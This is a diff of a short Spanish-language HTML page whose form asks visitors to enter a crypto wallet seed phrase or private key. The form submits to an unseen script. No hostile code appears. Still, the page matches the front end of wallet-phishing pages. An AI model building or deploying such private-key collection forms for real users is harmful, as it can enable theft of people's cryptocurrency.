@@ -1,15 +1,19 @@
 
-    <html>
-    <head><title>Gestión de Billetera Cripto</title></head>
+    <!DOCTYPE html>
+    <html lang="es">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Ingreso de clave privada</title>
+    </head>
     <body>
-        <h1>Introduce tu Frase Semilla o Clave Privada</h1>
-        <form id="walletForm">
-            <label for="clave">Frase Semilla o Clave Privada:</label><br>
-            <input type="text" id="clave" name="clave" required><br><br>
-            <button type="submit">Procesar</button>
+        <h1>Ingrese su clave privada</h1>
+        <form id="claveForm">
+            <input type="password" id="clavePrivada" placeholder="Ingrese su clave privada" required>
+            <button type="submit">Guardar</button>
         </form>
-        <p id="resultado"></p>
-        <script src="script.js"></script>
+
+        <script src="razas.js"></script>
     </body>
     </html>
     
